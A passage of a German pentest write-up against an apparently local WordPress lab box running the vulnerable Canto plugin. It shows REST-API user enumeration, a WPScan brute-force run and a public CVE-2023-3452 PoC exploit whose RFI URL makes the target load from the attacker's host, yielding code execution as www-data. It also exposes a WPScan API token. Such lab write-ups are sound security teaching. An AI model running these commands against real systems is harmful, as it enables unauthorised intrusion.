+                <strong>Analyse:</strong> Der Versuch, Benutzer-ID 2 abzurufen, resultierte in einem `HTTP/1.1 404 Not Found` Statuscode. Dies bestätigt, dass kein Benutzer mit dieser spezifischen ID auf dem System existiert oder zumindest nicht über diesen Endpunkt verfügbar gemacht wird.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der 404-Status ist das erwartete Ergebnis für eine nicht existierende Ressource. In diesem Kontext bedeutet es, dass es wahrscheinlich nur einen einzigen Benutzer auf diesem WordPress-System gibt, nämlich den mit ID 1. Dies reduziert die Anzahl potenzieller Benutzernamen für Brute-Force-Angriffe erheblich.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Konzentriere dich auf die Informationsbeschaffung und die spätere Passwort-Attacke für den Benutzer mit ID 1. Es ist unwahrscheinlich, dass durch weiteres sequenzielles Abfragen von IDs zusätzliche Benutzer gefunden werden.
+                <br><strong>Empfehlung (Admin):</strong> Dies bestätigt, dass zwar einzelne Benutzer-IDs prüfbar sind, aber das System nicht unnötig viele Standard-Benutzer-IDs bereitstellt. Dennoch sollte die API-Benutzeraufzählung, wie zuvor empfohlen, deaktiviert werden, um auch die Existenz einzelner Benutzer zu verbergen.
+            </p>
+
+             <p>
+                Nachdem bestätigt war, dass Benutzer-ID 1 existiert, habe ich den `jq`-Filter verwendet, um die vollständige JSON-Ausgabe für diesen Benutzer zu parsen und die relevanten Informationen, insbesondere den Benutzernamen, zu extrahieren.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~]
+└─#  <span class="command">curl http://192.168.2.57/index.php/wp-json/WP/V2/users/1 -s| jq</span>
+                    </div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+{
+  &quot;id&quot;: <span class="command">1</span>,
+  &quot;name&quot;: <span class="password">&quot;erik&quot;</span>,
+  &quot;url&quot;: <span class="command">&quot;http://192.168.1.36&quot;</span>,
+  &quot;description&quot;: &quot;&quot;,
+  &quot;link&quot;: <span class="command">&quot;http://192.168.2.57/index.<span class="command">php</span>/author/erik/&quot;</span>,
+  &quot;slug&quot;: <span class="command">&quot;erik&quot;</span>,
+  &quot;avatar_urls&quot;: {
+    &quot;24&quot;: &quot;https://secure.gravatar.com/avatar/87924606b4131a8aceeeae8868531fbb9712aaa07a5d3a756b26ce0f5d6ca674?s=24&amp;d=mm&amp;r=g&quot;,
+    &quot;48&quot;: &quot;https://secure.gravatar.com/avatar/87924606b4131a8aceeeae8868531fbb9712aaa07a5d3a756b26ce0f5d6ca674?s=48&amp;d=mm&amp;r=g&quot;,
+    &quot;96&quot;: &quot;https://secure.gravatar.com/avatar/87924606b4131a8aceeeae8868531fbb9712aaa07a5d3a756b26ce0f5d6ca674?s=96&amp;d=mm&amp;r=g&quot;
+  },
+  &quot;meta&quot;: [],
+  &quot;_links&quot;: {
+    &quot;self&quot;: [
+      {
+        &quot;href&quot;: <span class="command">&quot;http://192.168.2.57/index.<span class="command">php</span>/wp-json/wp/v2/users/1&quot;</span>,
+        &quot;targetHints&quot;: {
+          &quot;allow&quot;: [
+            &quot;GET&quot;
+          ]
+        }
+      }
+    ],
+    &quot;collection&quot;: [
+      {
+        &quot;href&quot;: <span class="command">&quot;http://192.168.2.57/index.<span class="command">php</span>/wp-json/wp/v2/users&quot;</span>
+      }
+    ]
+  }
+}</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Die JSON-Ausgabe für Benutzer-ID 1 wurde erfolgreich abgerufen und von `jq` formatiert. Das wichtigste Feld hier ist `"name"`, das den Benutzernamen `<span class="password">"erik"</span>` preisgibt. Weitere Informationen wie URL, Link zum Autoren-Archiv, Slug und Gravatar-URLs sind ebenfalls enthalten.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die erfolgreiche Extraktion des Benutzernamens `<span class="password">"erik"</span>` ist ein kritischer Fortschritt. Dieser Benutzername kann nun direkt für Authentifizierungsversuche verwendet werden, insbesondere für Brute-Force-Angriffe auf `wp-login.php` oder `xmlrpc.php`. Die Fähigkeit, Benutzernamen über die API zu erhalten, ist eine signifikante Informationslecks-Schwachstelle.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Verwende den Benutzernamen `<span class="password">"erik"</span>` als Ziel für Brute-Force-Angriffe. Priorisiere Passwortlisten, die gängige oder themenbezogene Passwörter enthalten könnten.
+                <br><strong>Empfehlung (Admin):</strong> Deaktiviere die Benutzeraufzählung über die REST API (erneut betont). Sensibilisiere Benutzer für die Wahl starker, einzigartiger Passwörter. Implementiere eine Sperrmechanismus für fehlgeschlagene Login-Versuche.
+            </p>
+
+            <p>
+                Um eine umfassende Analyse der WordPress-Installation durchzuführen und nach bekannten Schwachstellen in Core, Themes und Plugins zu suchen, habe ich das spezialisierte Tool WPScan eingesetzt. WPScan ist für WordPress-Penetrationstests optimiert und automatisiert viele Erkennungsschritte. Ich habe es auch genutzt, um einen ersten Brute-Force-Versuch mit dem gefundenen Benutzernamen und einer gängigen Wortliste durchzuführen.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~]
+└─#  <span class="command">wpscan --url http://canto.hmv --enumerate vp --plugins-detection aggressive --api-token RoBoAaM72LLsihOlqUJrA1EleT6AJAd9QxQ9rbmQNCY --usernames erik --passwords /usr/share/wordlists/rockyou.txt</span>
+                    </div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | <span class="command">'_</span> \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|\<span class="command">'_</span>|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.28
+       Sponsored by Automattic - <span class="command">[Link: https://automattic.com/ | Ziel: https://automattic.com/]</span>
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+<span class="command">[i] It seems like you have not updated the database for some time.</span>
+
+<span class="command">[+] URL: http://canto.hmv/ [192.168.2.57]</span>
+<span class="command">[+] Started: Mon Jun 23 16:05:45 2025</span>
+
+Interesting Finding(s):
+
+<span class="command">[+] Headers</span>
+ | Interesting Entry: <span class="command">Server: Apache/2.4.57 (Ubuntu)</span>
+ | Found By: Headers (Passive Detection)
+ | Confidence: <span class="command">100%</span>
+
+<span class="command">[+] XML-RPC seems to be enabled: http://canto.hmv/xmlrpc.<span class="command">php</span></span>
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: <span class="command">100%</span>
+ | References:
+ |  - <span class="command">[Link: http://codex.wordpress.org/XML-RPC_Pingback_API | Ziel: http://codex.wordpress.org/XML-RPC_Pingback_API]</span>
+ |  - <span class="command">[Link: https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | Ziel: https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/]</span>
+ |  - <span class="command">[Link: https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | Ziel: https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/]</span>
+ |  - <span class="command">[Link: https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | Ziel: https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/]</span>
+ |  - <span class="command">[Link: https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ | Ziel: https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/]</span>
+
+<span class="command">[+] WordPress readme found: http://canto.hmv/readme.html</span>
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: <span class="command">100%</span>
+
+<span class="command">[+] Upload directory has listing enabled: http://canto.hmv/wp-content/uploads/</span>
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: <span class="command">100%</span>
+
+<span class="command">[+] The external WP-Cron seems to be enabled: http://canto.hmv/wp-cron.<span class="command">php</span></span>
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: <span class="command">60%</span>
+ | References:
+ |  - <span class="command">[Link: https://www.iplocation.net/defend-wordpress-from-ddos | Ziel: https://www.iplocation.net/defend-wordpress-from-ddos]</span>
+ |  - <span class="command">[Link: https://github.com/wpscanteam/wpscan/issues/1299 | Ziel: https://github.com/wpscanteam/wpscan/issues/1299]</span>
+
+<span class="command">[+] WordPress version 6.8.1 identified (Latest, released on 2025-04-30).</span>
+ | Found By: Emoji Settings (Passive Detection)
+ |  - http://canto.hmv/, Match: <span class="command">&apos;wp-includes\/js\/wp-emoji-release.min.js?ver=6.8.1&apos;</span>
+ | Confirmed By: Meta Generator (Passive Detection)
+ |  - http://canto.hmv/, Match: <span class="command">&apos;WordPress 6.8.1&apos;</span>
+
+<span class="command">[+] WordPress theme in use: twentytwentyfour</span>
+ | Location: http://canto.hmv/wp-content/themes/twentytwentyfour/
+ | Last Updated: <span class="command">2024-11-13T00:00:00.000Z</span>
+ | Readme: http://canto.hmv/wp-content/themes/twentytwentyfour/readme.<span class="command">txt</span>
+ | <span class="password">[!] The version is out of date, the latest version is 1.3</span>
+ | <span class="password">[!] Directory listing is enabled</span>
+ | Style <span class="command">URL</span>: http://canto.hmv/wp-content/themes/twentytwentyfour/style.css
+ | Style Name: Twenty Twenty-Four
+ | Style <span class="command">URI</span>: <span class="command">[Link: https://wordpress.org/themes/twentytwentyfour/ | Ziel: https://wordpress.org/themes/twentytwentyfour/]</span>
+ | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
+ | Author: the WordPress team
+ | Author <span class="command">URI</span>: <span class="command">[Link: https://wordpress.org | Ziel: https://wordpress.org]</span>
+ |
+ | Found By: <span class="command">Urls In Homepage (Passive Detection)</span>
+ |
+ | Version: <span class="password">1.1 (80% confidence)</span>
+ | Found By: Style (Passive Detection)
+ |  - http://canto.hmv/wp-content/themes/twentytwentyfour/style.css, Match: <span class="command">&apos;Version: 1.1&apos;</span>
+
+<span class="command">[+] Enumerating Vulnerable Plugins (via Aggressive Methods)</span>
+ Checking Known Locations - Time: <span class="command">00:00:05 &lt;============&gt; (7343 / 7343)  100.00% Time: 00:00:05</span>
+<span class="command">[+] Checking Plugin Versions (via Passive and Aggressive Methods)</span>
+
+<span class="command">[i] Plugin(s) Identified:</span>
+
+<span class="command">[+] canto</span>
+ | Location: http://canto.hmv/wp-content/plugins/canto/
+ | Last Updated: <span class="command">2025-04-10T07:17:00.000Z</span>
+ | Readme: http://canto.hmv/wp-content/plugins/canto/readme.<span class="command">txt</span>
+ | <span class="password">[!] The version is out of date, the latest version is 3.1.0</span>
+ |
+ | Found By: Known Locations (Aggressive Detection)
+ |  - http://canto.hmv/wp-content/plugins/canto/, status: <span class="command">200</span>
+ |
+ | <span class="password">[!] 4 vulnerabilities identified:</span>
+ |
+ | <span class="password">[!] Title: Canto &lt; 3.0.9 - Unauthenticated Blind SSRF</span>
+ |     Fixed in: <span class="command">3.0.9</span>
+ |     References:
+ |      - <span class="command">[Link: https://wpscan.com/vulnerability/29c89cc9-ad9f-4086-a762-8896eba031c6 | Ziel: https://wpscan.com/vulnerability/29c89cc9-ad9f-4086-a762-8896eba031c6]</span>
+ |      - <span class="command">[Link: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-28976 | Ziel: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-28976]</span>
+ |      - <span class="command">[Link: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-28977 | Ziel: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-28977]</span>
+ |      - <span class="command">[Link: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-28978 | Ziel: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-28978]</span>
+ |      - <span class="command">[Link: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-24063 | Ziel: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-24063]</span>
+ |      - <span class="command">[Link: https://gist.github.com/p4nk4jv/87aebd999ce4b28063943480e95fd9e0 | Ziel: https://gist.github.com/p4nk4jv/87aebd999ce4b28063943480e95fd9e0]</span>
+ |
+ | <span class="password">[!] Title: Canto &lt; 3.0.5 - Unauthenticated Remote File Inclusion</span>  // anscheinend gibts ein plugin das tatsächlich canto heisst!
+ |     Fixed in: <span class="command">3.0.5</span>
+ |     References:
+ |      - <span class="command">[Link: https://wpscan.com/vulnerability/9e2817c7-d4aa-4ed9-a3d7-18f3117ed810 | Ziel: https://wpscan.com/vulnerability/9e2817c7-d4aa-4ed9-a3d7-18f3117ed810]</span>
+ |      - <span class="command">[Link: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-3452 | Ziel: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-3452]</span>
+ |
+ | <span class="password">[!] Title: Canto &lt; 3.0.7 - Unauthenticated RCE</span>
+ |     Fixed in: <span class="command">3.0.7</span>
+ |     References:
+ |      - <span class="command">[Link: https://wpscan.com/vulnerability/1595af73-6f97-4bc9-9cb2-14a55daaa2d4 | Ziel: https://wpscan.com/vulnerability/1595af73-6f97-4bc9-9cb2-14a55daaa2d4]</span>
+ |      - <span class="command">[Link: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-25096 | Ziel: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-25096]</span>
+ |      - <span class="command">[Link: https://patchstack.com/database/vulnerability/canto/wordpress-canto-plugin-3-0-6-unauthenticated-remote-code-execution-rce-vulnerability | Ziel: https://patchstack.com/database/vulnerability/canto/wordpress-canto-plugin-3-0-6-unauthenticated-remote-code-execution-rce-vulnerability]</span>
+ |
+ | <span class="password">[!] Title: Canto &lt; 3.0.9 - Unauthenticated Remote File Inclusion</span>
+ |     Fixed in: <span class="command">3.0.9</span>
+ |     References:
+ |      - <span class="command">[Link: https://wpscan.com/vulnerability/3ea53721-bdf6-4203-b6bc-2565d6283159 | Ziel: https://wpscan.com/vulnerability/3ea53721-bdf6-4203-b6bc-2565d6283159]</span>
+ |      - <span class="command">[Link: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-4936 | Ziel: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-4936]</span>
+ |      - <span class="command">[Link: https://www.wordfence.com/threat-intel/vulnerabilities/id/95a68ae0-36da-499b-a09d-4c91db8aa338 | Ziel: https://www.wordfence.com/threat-intel/vulnerabilities/id/95a68ae0-36da-499b-a09d-4c91db8aa338]</span>
+ |
+ | Version: <span class="password">3.0.4 (100% confidence)</span>
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - http://canto.hmv/wp-content/plugins/canto/readme.<span class="command">txt</span>
+ | Confirmed By: Composer File (Aggressive Detection)
+ |  - http://canto.hmv/wp-content/plugins/canto/<span class="command">package.json</span>, Match: <span class="command">&apos;3.0.4&apos;</span>
+
+<span class="command">[+] Performing password attack on Wp Login against 1 user/s</span>
+Trying erik / R3v_m4lwh3r3_k1nR3v_m4lwh3r3_k1n Time: 00:00:02 &lt;&gt; (275 / 14344493)  0.00%  <span class="command">ETA:^Cying erik / picture Time: 00:00:18 &lt;               &gt; (2110 / 14344493)  0.01%  ETA: 35:17:02</span>
+<span class="command">[i] No Valid Passwords Found.</span>
+
+<span class="command">[+] WPScan DB API OK Time: 00:00:18 &lt;                &gt; (2113 / 14344493)  0.01%  ETA: 35:15:31</span>
+ | Plan: free
+ | Requests Done (during the scan): <span class="command">4</span>
+ | Requests Remaining: <span class="command">18</span>
+
+<span class="command">[+] Finished: Mon Jun 23 16:06:19 2025</span>
+<span class="command">[+] Requests Done: 9504</span>
+<span class="command">[+] Cached Requests: 7</span>
+<span class="command">[+] Data Sent: 2.607 MB</span>
+<span class="command">[+] Data Received: 13.39 MB</span>
+<span class="command">[+] Memory used: 242.508 MB</span>
+<span class="command">[+] Elapsed time: 00:00:34</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> WPScan liefert eine Fülle von Informationen. Es bestätigt frühere Funde wie den Apache Server, `xmlrpc.php`, `readme.html` und das Verzeichnislisting in `wp-content/uploads/`. Es identifiziert die genaue WordPress-Version (6.8.1) und das aktive Theme (twentytwentyfour, Version 1.1). Kritisch ist die Identifizierung des installierten **Canto Plugins**, dessen Version (3.0.4) als veraltet markiert wird und für das WPScan **vier bekannte, unauthentifizierte Schwachstellen** auflistet: Blind SSRF (&lt; 3.0.9), Remote File Inclusion (RFI) (&lt; 3.0.5), Remote Code Execution (RCE) (&lt; 3.0.7) und eine weitere RFI (&lt; 3.0.9). Der Passwortangriff mit `rockyou.txt` auf den Benutzer "erik" war nicht erfolgreich.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dies ist ein extrem wichtiger Schritt. Die identifizierten Schwachstellen im Canto-Plugin, insbesondere die **Unauthentifizierten RCE** (Remote Code Execution) und **RFI** (Remote File Inclusion) in Versionen kleiner als 3.0.7 bzw. 3.0.5/3.0.9, sind hochkritisch. Sie bedeuten, dass ein Angreifer *ohne* gültige Zugangsdaten Code auf dem Server ausführen oder Dateien inkludieren kann, was typischerweise zu einer Kompromittierung des Systems führt. Das veraltete Theme und das Verzeichnislisting sind ebenfalls Schwachstellen, aber die Plugin-Schwachstellen sind hier das Hauptproblem. Der fehlgeschlagene Brute-Force-Versuch zeigt, dass das Passwort nicht in der verwendeten Wortliste enthalten ist, ist aber in Anbetracht der Plugin-Schwachstellen derzeit nicht der primäre Weg zum Initial Access.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Priorisiere die Ausnutzung der unauthentifizierten RCE- oder RFI-Schwachstelle im Canto-Plugin (Version 3.0.4 ist anfällig für alle gelisteten). Suche nach öffentlichen Proof-of-Concept (PoC) Exploits für diese CVEs, insbesondere CVE-2023-3452 (RFI &lt; 3.0.5) oder CVE-2024-25096 (RCE &lt; 3.0.7), da diese oft direkt in Shell-Zugriff münden. Die Kompromittierung über diese Schwachstelle ist wahrscheinlich der schnellste und zuverlässigste Weg zum Initial Access.
+                <br><strong>Empfehlung (Admin):</strong> Aktualisiere das Canto Plugin *umgehend* auf die neueste Version (3.1.0 oder höher), um alle gelisteten Schwachstellen zu beheben. Dies ist die kritischste Maßnahme. Halte außerdem das WordPress Theme aktuell und deaktiviere das Verzeichnislisting in `wp-content/uploads/`.
+            </p>
+        </section> <!-- Ende section web-enumeration -->
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+            <p>
+                Nach der Identifizierung der kritischen, unauthentifizierten RFI/RCE Schwachstelle im Canto Plugin war mein nächster logischer Schritt, nach einem verfügbaren Proof-of-Concept (PoC) Exploit zu suchen. Oft teilen Sicherheitsforscher Exploits auf Plattformen wie GitHub.
+            </p>
+
+            <p>
+                Ich wurde schnell auf GitHub fündig und fand ein Python-Skript, das speziell zur Ausnutzung der CVE-2023-3452 Schwachstelle entwickelt wurde.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~/Hackingtools]
+└─#  <span class="command">git clone [Link: https://github.com/leoanggal1/CVE-2023-3452-PoC.git | Ziel: https://github.com/leoanggal1/CVE-2023-3452-PoC.git]</span>
+                    </div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+Klone nach &apos;CVE-2023-3452-PoC&apos;...
+remote: Enumerating <span class="command">objects: 88</span>, done.
+remote: Counting <span class="command">objects: 100% (88/88)</span>, done.
+remote: Compressing <span class="command">objects: 100% (87/87)</span>, done.
+remote: Total <span class="command">88 (delta 26)</span>, reused <span class="command">0 (delta 0)</span>, pack-reused <span class="command">0 (from 0)</span>
+Empfange <span class="command">Objekte: 100% (88/88)</span>, <span class="command">199.77 KiB | 5.12 MiB/s</span>, fertig.
+Löse <span class="command">Unterschiede auf: 100% (26/26)</span>, fertig.</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Befehl `git clone` wurde verwendet, um das PoC-Skript von der angegebenen GitHub-URL herunterzuladen. Die Ausgabe zeigt den Fortschritt des Klonvorgangs, einschließlich der Anzahl der Objekte und Deltas, die übertragen wurden. Der Prozess war erfolgreich und das Repository wurde auf mein System kopiert.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das erfolgreiche Klonen des Repositories bedeutet, dass ich nun das spezifische Exploit-Skript zur Verfügung habe, das auf die im vorherigen Schritt identifizierte Schwachstelle abzielt. Dies ist ein entscheidender Schritt zur Kompromittierung des Zielsystems.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuche das heruntergeladene Skript, um seine Funktionsweise zu verstehen, bevor du es ausführst. Stelle sicher, dass es keine bösartigen Nebeneffekte hat und wie die Parameter zur Ausnutzung der Schwachstelle genutzt werden.
+                <br><strong>Empfehlung (Admin):</strong> Überwache Netzwerkverkehr auf bekannte Muster von Exploit-Frameworks oder spezifischen Schwachstellen-Ausnutzungen. Stelle sicher, dass Dateizugriffsberechtigungen auf dem Webserver so restriktiv wie möglich sind, um die Auswirkungen erfolgreicher Datei-Inclusion-Angriffe zu minimieren.
+            </p>
+
+            <p>
+                Anschließend wechselte ich in das neu erstellte Verzeichnis, um mir die heruntergeladenen Dateien anzusehen.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~/Hackingtools]
+└─#  <span class="command">cd CVE-2023-3452-PoC</span>
+                    </div>
+                </div>
+                 <div class="terminal">
+                    <pre></pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der `cd` Befehl ändert das aktuelle Arbeitsverzeichnis in das, das den PoC-Code enthält. Dies ist ein notwendiger Schritt, um auf die Skripte und zugehörigen Dateien zugreifen zu können.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Ein Standard-Schritt im Workflow nach dem Klonen eines Repositories. Funktional, aber ohne direkte sicherheitstechnische Relevanz.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Überprüfe immer den Inhalt eines heruntergeladenen Skripts, besonders von unbekannten Quellen.
+                <br><strong>Empfehlung (Admin):</strong> Keine direkte Empfehlung basierend auf diesem Schritt.
+            </p>
+
+            <p>
+                Um einen Überblick über die heruntergeladenen Dateien zu erhalten, listete ich den Inhalt des Verzeichnisses auf.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~/Hackingtools/CVE-2023-3452-PoC]
+└─#  <span class="command">ll</span>
+                    </div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+insgesamt 16
+<span class="command">drwxr-xr-x 2 root root 4096 23. Jun 16:10 assets</span>
+<span class="command">-rw-r--r-- 1 root root 4749 23. Jun 16:10 CVE-2023-3452.py</span>
+<span class="command">-rw-r--r-- 1 root root 2776 23. Jun 16:10 README.md</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Befehl `ll` (eine Kurzform von `ls -l`, abhängig vom System) zeigt den Inhalt des aktuellen Verzeichnisses an. Ich sehe hier ein Unterverzeichnis `assets`, das Python-Skript `CVE-2023-3452.py` (das eigentliche Exploit) und die `README.md` Datei, die oft Anweisungen zur Nutzung des Skripts enthält. Die Dateiberechtigungen sind Standard für heruntergeladene Dateien.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Auflistung bestätigt, dass das Exploit-Skript (`CVE-2023-3452.py`) vorhanden ist und bereit zur Nutzung steht. Die `README.md` ist eine wichtige Ressource, um die genaue Syntax und Funktionsweise des PoC zu verstehen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Lese immer die `README.md` oder die Hilfe (`-h` Option des Skripts), um die korrekte Anwendung des PoC zu verstehen.
+                <br><strong>Empfehlung (Admin):</strong> Keine direkte Empfehlung basierend auf diesem Schritt.
+            </p>
+
+            <p>
+                Um die Ausnutzung der RFI-Schwachstelle mit dem gerade heruntergeladenen Skript zu demonstrieren, habe ich zuerst versucht, einen einfachen Befehl wie `id` auf dem Zielsystem auszuführen. Dies dient als schneller Test, ob die RCE-Komponente der Schwachstelle nutzbar ist.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~/Hackingtools/CVE-2023-3452-PoC]
+└─#  <span class="command">python3 CVE-2023-3452.py -u http://192.168.2.57 -LHOST 192.168.2.199 -c &apos;id&apos;</span>
+                    </div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+Exploitation <span class="command">URL</span>: http://192.168.2.57/wp-content/plugins/canto/includes/lib/download.<span class="command">php</span>?<span class="command">wp_abspath</span>=http://192.168.2.199:8080&amp;<span class="command">cmd</span>=id
+Local web server on <span class="command">PORT</span> 8080...
+192.168.2.57 - - [<span class="command">23/Jun/2025 16:13:27</span>] <span class="password">&quot;GET /wp-admin/admin.<span class="command">php</span> HTTP/1.1&quot; 200 -</span>
+Server response:
+<span class="password">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe das Python-Skript mit den notwendigen Parametern ausgeführt: Ziel-URL (`-u`), meine lokale IP (`-LHOST`, die vom Skript als Basis für die RFI genutzt wird, um das Ziel eine Datei von meinem System laden zu lassen), und den Befehl, der ausgeführt werden soll (`-c 'id'`). Das Skript baut eine Exploitation-URL zusammen, startet einen lokalen HTTP-Server auf Port 8080 und schickt die Anfrage an das Ziel. Die Ausgabe zeigt, dass das Zielsystem tatsächlich eine Anfrage an meinen lokalen Server sendet (`GET /wp-admin/admin.php ... 200 -`), und wichtiger noch, der Server antwortet mit dem Ergebnis des ausgeführten Befehls `id`: `<span class="password">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Fantastisch! Die Ausführung des `id`-Befehls war erfolgreich, was die **Remote Code Execution (RCE)** Schwachstelle im Canto-Plugin bestätigt. Ich kann beliebige Befehle als Benutzer `www-data` auf dem Zielsystem ausführen. Dies ist der erfolgreiche Initial Access Vektor und ein kritischer Moment im Test.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Da RCE als Benutzer `www-data` möglich ist, besteht der nächste Schritt darin, eine persistente Shell auf das Zielsystem zu erhalten. Eine Reverse Shell ist dafür eine gängige und effektive Methode.
+                <br><strong>Empfehlung (Admin):</strong> Diese Demonstration zeigt die schwerwiegenden Auswirkungen der Schwachstelle. Stelle sicher, dass das Canto-Plugin umgehend auf eine nicht anfällige Version aktualisiert wird. Überprüfe die Berechtigungen des Benutzers `www-data` auf dem System; sie sollten so eingeschränkt wie möglich sein.
+            </p>
+        </section>
+
+        <section id="proof-of-concept">
+             <h2>Proof of Concept</h2>
+             <p>
+                <strong>Kurzbeschreibung:</strong> Dieser Proof of Concept demonstriert die Ausnutzung der unauthentifizierten Remote File Inclusion (RFI) und Remote Code Execution (RCE) Schwachstelle im veralteten Canto WordPress Plugin (Version 3.0.4), um unauthentifizierten Zugriff auf das Zielsystem mit den Rechten des Webserver-Benutzers `www-data` zu erlangen.
+             </p>
+             <p>
+                <strong>Voraussetzungen:</strong>
+                <ul>
+                    <li>Identifizierung der Canto Plugin Schwachstelle (&lt; 3.0.7 für RCE, &lt; 3.0.5 für RFI) mittels WPScan oder manueller Analyse.</li>
+                    <li>Zugriff auf ein Angreifersystem mit Python3, git, curl und netcat.</li>
+                    <li>Herunterladen des PoC-Exploit-Skripts von [Link: https://github.com/leoanggal1/CVE-2023-3452-PoC.git | Ziel: https://github.com/leoanggal1/CVE-2023-3452-PoC.git].</li>
+                    <li>Eine Reverse Shell Payload (z.B. `php-reverse-shell.php`).</li>
+                    <li>Kenntnis der lokalen IP-Adresse des Angreifersystems und der IP-Adresse des Zielsystems.</li>
+                </ul>
+             </p>
+             <p>
+                 <strong>Schritt-für-Schritt-Anleitung:</strong>
+             </p>
+
+             <p>
+                 1. Klonen des PoC-Repositorys auf das Angreifersystem.
+             </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~/Hackingtools]
+└─#  <span class="command">git clone [Link: https://github.com/leoanggal1/CVE-2023-3452-PoC.git | Ziel: https://github.com/leoanggal1/CVE-2023-3452-PoC.git]</span>
+                    </div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+Klone nach &apos;CVE-2023-3452-PoC&apos;...
+remote: Enumerating <span class="command">objects: 88</span>, done.
+... (gekürzte Ausgabe)</pre>
+                 </div>
+             </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Das offizielle PoC-Skript wird heruntergeladen, um die Ausnutzung der Schwachstelle zu vereinfachen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Verwendung eines spezifischen PoC erhöht die Erfolgsquote bei der Ausnutzung der Schwachstelle.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Verifiziere immer die Quelle und den Inhalt von PoC-Skripten.
+                <br><strong>Empfehlung (Admin):</strong> Keine direkte Empfehlung.
+            </p>
+
+             <p>
